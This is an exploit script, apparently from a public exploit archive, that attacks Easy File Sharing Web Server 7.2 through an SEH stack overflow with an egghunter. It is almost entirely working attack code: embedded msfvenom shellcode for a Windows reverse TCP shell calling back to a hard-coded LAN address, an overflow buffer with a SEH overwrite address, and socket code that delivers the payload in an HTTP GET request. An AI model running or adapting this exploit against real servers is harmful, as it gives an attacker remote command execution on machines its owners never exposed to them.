#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server 7.2 SEH Overflow with Egghunter
# Date: July 29, 2016
# Exploit Author: ch3rn0byl
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/download.php
# Version: 7.2
# Tested on: Windows 7, 8, 8.1, 10
# Admin privileges anyone?? hehe ;)
#
# Note: I modified the payload and a couple of other strings to make this produce a reverse shell.
# The original author, above, deserves all the credit for this tool
# jmm 12/01/2018
# 
from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from struct import pack
from time import sleep
from subprocess import call

host = argv[1]
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=4444 -b '\x00\x0a\x0d' --smallest -f py
rekt =  ""
rekt += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
rekt += "\xa6\xfe\x42\x9b\x83\xeb\xfc\xe2\xf4\x5a\x16\xc0\x9b"
rekt += "\xa6\xfe\x22\x12\x43\xcf\x82\xff\x2d\xae\x72\x10\xf4"
rekt += "\xf2\xc9\xc9\xb2\x75\x30\xb3\xa9\x49\x08\xbd\x97\x01"
rekt += "\xee\xa7\xc7\x82\x40\xb7\x86\x3f\x8d\x96\xa7\x39\xa0"
rekt += "\x69\xf4\xa9\xc9\xc9\xb6\x75\x08\xa7\x2d\xb2\x53\xe3"
rekt += "\x45\xb6\x43\x4a\xf7\x75\x1b\xbb\xa7\x2d\xc9\xd2\xbe"
rekt += "\x1d\x78\xd2\x2d\xca\xc9\x9a\x70\xcf\xbd\x37\x67\x31"
rekt += "\x4f\x9a\x61\xc6\xa2\xee\x50\xfd\x3f\x63\x9d\x83\x66"
rekt += "\xee\x42\xa6\xc9\xc3\x82\xff\x91\xfd\x2d\xf2\x09\x10"
rekt += "\xfe\xe2\x43\x48\x2d\xfa\xc9\x9a\x76\x77\x06\xbf\x82"
rekt += "\xa5\x19\xfa\xff\xa4\x13\x64\x46\xa1\x1d\xc1\x2d\xec"
rekt += "\xa9\x16\xfb\x96\x71\xa9\xa6\xfe\x2a\xec\xd5\xcc\x1d"
rekt += "\xcf\xce\xb2\x35\xbd\xa1\x01\x97\x23\x36\xff\x42\x9b"
rekt += "\x8f\x3a\x16\xcb\xce\xd7\xc2\xf0\xa6\x01\x97\xcb\xf6"
rekt += "\xae\x12\xdb\xf6\xbe\x12\xf3\x4c\xf1\x9d\x7b\x59\x2b"
rekt += "\xd5\xf1\xa3\x96\x82\x33\xa7\x94\x2a\x99\xa6\xef\x1e"
rekt += "\x12\x40\x94\x52\xcd\xf1\x96\xdb\x3e\xd2\x9f\xbd\x4e"
rekt += "\x23\x3e\x36\x97\x59\xb0\x4a\xee\x4a\x96\xb2\x2e\x04"
rekt += "\xa8\xbd\x4e\xce\x9d\x2f\xff\xa6\x77\xa1\xcc\xf1\xa9"
rekt += "\x73\x6d\xcc\xec\x1b\xcd\x44\x03\x24\x5c\xe2\xda\x7e"
rekt += "\x9a\xa7\x73\x06\xbf\xb6\x38\x42\xdf\xf2\xae\x14\xcd"
rekt += "\xf0\xb8\x14\xd5\xf0\xa8\x11\xcd\xce\x87\x8e\xa4\x20"
rekt += "\x01\x97\x12\x46\xb0\x14\xdd\x59\xce\x2a\x93\x21\xe3"
rekt += "\x22\x64\x73\x45\xb2\x2e\x04\xa8\x2a\x3d\x33\x43\xdf"
rekt += "\x64\x73\xc2\x44\xe7\xac\x7e\xb9\x7b\xd3\xfb\xf9\xdc"
rekt += "\xb5\x8c\x2d\xf1\xa6\xad\xbd\x4e"

# Our tag is hive: \x68\x69\x76\x65

egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
egghunter += '\x05\x5a\x74\xef\xb8\x68\x69\x76\x65\x8b\xfa\xaf\x75'
egghunter += '\xea\xaf\x75\xe7\xff\xe7'

crash = "A" * 4061
crash += pack('<L', 0x909006eb)
crash += pack('<L', 0x10019ce3)
crash += egghunter
crash += "D" * (5500 - 4061 - 8 - len(egghunter))

payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)
payload += 'hivehive'
payload += rekt
payload += 'E' * (800 - len(rekt))

print '[+] Trying to exploit {}...'.format(host)

try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, 80))
        print '[+] Sending payload...'
        s.send(payload)
        s.close()
        print '[+] Trying to connect to target...\n'
        try:
                sleep(2)
                #call(['ncat', host, '54321'])
        except:
                print '[!] Whoops!! Something went wrong?'
except:
        print '[!] Whoops!! Something went wrong?'
finally:
        print '\n[+] login to argv[1] User=egghunter Pass=3ggHunter!'
